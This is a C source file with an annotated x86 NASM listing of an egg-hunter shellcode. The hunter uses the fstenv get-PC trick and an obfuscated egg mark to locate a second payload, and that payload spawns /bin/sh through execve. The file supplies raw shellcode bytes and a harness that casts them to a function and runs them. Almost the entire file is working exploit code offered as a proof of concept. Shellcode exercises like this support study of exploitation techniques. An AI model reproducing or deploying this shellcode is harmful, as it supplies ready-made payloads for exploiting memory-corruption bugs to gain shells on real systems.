/*
;author:	Filippo "zinzloun" Bersani
;date: 		28/11/2016
;version:	1.0
;X86 Assembly/NASM Syntax
;tested on: Linux OpenSuse001 2.6.34-12-desktop 32bit
;           Linux ubuntu 3.13.0-100-generic #147~precise1-Ubuntu 32bit
;			Linux bb32 4.4.0-45-generic 32bit

; description
;	egg hunter shellcode: different approach to the classic jpc technique using fstenv and dynamic memory location
;	plus a bit of obfuscation to generate the egg mark

; POC
;	execute a shell

; see comment for details



global _start

section .text

_start:

fldpi
fstenv [esp-0xc]			;fstenv getpc: the entry mem addr of this code (_start)
pop esi						;pop it in esi
xor eax,eax
mov al, 0x1f				;set the offset bytes to point at the end of the program
add esi, eax				;set the mem addr dinamically

set_mark:
 mov edx, dword 0x65676760	;a dumm value..
 rol edx, 0x4 				;get the real mark: 56767606

find_egg:
 add esi,4 					;scan the next section of mem, since we are in 32 arch we need to add 4 bytes
 cmp[esi], edx 				;check if we have found the egg...
 jz find_egg  				;loop
 call esi    				;found our egg (zero flag is set), jump to the execution of the shellcode
*/

#include<stdio.h>
#include<string.h>

unsigned char egg_hunter[] = \
"\xd9\xeb\x9b\xd9\x74\x24\xf4\x5e\x31\xc0\xb0\x1f\x01\xc6\xba\x60\x67\x67\x65\xc1\xc2\x04\x83\xc6\x04\x39\x16\x74\xf9\xff\xd6"; //the actual egg hunter code
unsigned char shell_code[] = \
"\x31\xc0\xb0\x05\xfe\xc0\xfe\xc8\xb0\x06\x90" //dumm instructions
"\x06\x76\x76\x56" // egg id reversed
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"; // /bin/bash
main()
{
        printf("Egg hunter length:  %d\n", strlen(egg_hunter));
	printf("Total length: %d\n", strlen(egg_hunter)+strlen(shell_code));
        int (*ret)() = (int(*)())egg_hunter;
        ret();
}